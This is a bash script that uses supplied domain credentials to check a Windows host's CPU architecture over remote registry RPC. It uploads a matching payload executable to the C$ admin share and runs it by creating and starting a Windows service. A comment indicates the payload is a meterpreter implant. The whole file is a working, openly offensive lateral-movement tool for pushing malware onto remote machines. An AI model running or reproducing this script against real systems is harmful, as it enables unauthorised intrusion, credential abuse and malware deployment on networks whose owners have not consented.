#!/bin/bash

#Needed Variables
DOMAIN=$1
USER=$2
PASS=$3
HOST=$4

#Payload files for 32-bit and 64-bit systems
PAYLOAD_32="payload_32.exe"
PAYLOAD_64="payload_64.exe"
PAYLOAD=""
SERVICE_NAME="servicex"
#Construct credentials
CREDS="$DOMAIN\\$USER%$PASS"

echo [+] Checking $HOST architechture
CPU=$(timeout 2s net rpc registry getvalue 'HKLM\Hardware\Description\System\CentralProcessor\0' 'Identifier' -I $HOST -U "$CREDS") 2>&1

if [ $(echo $CPU | grep -c 64) -eq 1 ]
then
  PAYLOAD=$PAYLOAD_64
elif [ $(echo $CPU | grep -c 86) -eq 1 ]
then
  PAYLOAD=$PAYLOAD_32
else
  echo [+] Failed to connect to $HOST
  exit
fi

echo [+] Uploading file $PAYLOAD to $HOST
smbclient \\\\$HOST\\C$ -U "$CREDS" -c "put $PAYLOAD; exit" > /dev/null 2>&1

echo [+] Running $PAYLOAD on $HOST

# Using winexe
#winexe //$HOST -U "$CREDS" cmd\ /c\ c:\\$PAYLOAD

#Using RPC ( meterpreter dies if not migrated right after probably due to the way services work need to look into it )

#First, stop and delete possible previous instances of the service.
net rpc -I $HOST -U "$CREDS" service stop $SERVICE_NAME > /dev/null 2>&1
net rpc -I $HOST -U "$CREDS" service delete $SERVICE_NAME > /dev/null 2>&1

#Second, create and run a new service using the uploaded payload
net rpc -I $HOST -U "$CREDS" service create $SERVICE_NAME $SERVICE_NAME C:\\$PAYLOAD > /dev/null 2>&1
net rpc -I $HOST -U "$CREDS" service start $SERVICE_NAME > /dev/null 2>&1
echo [+] Done on $HOST
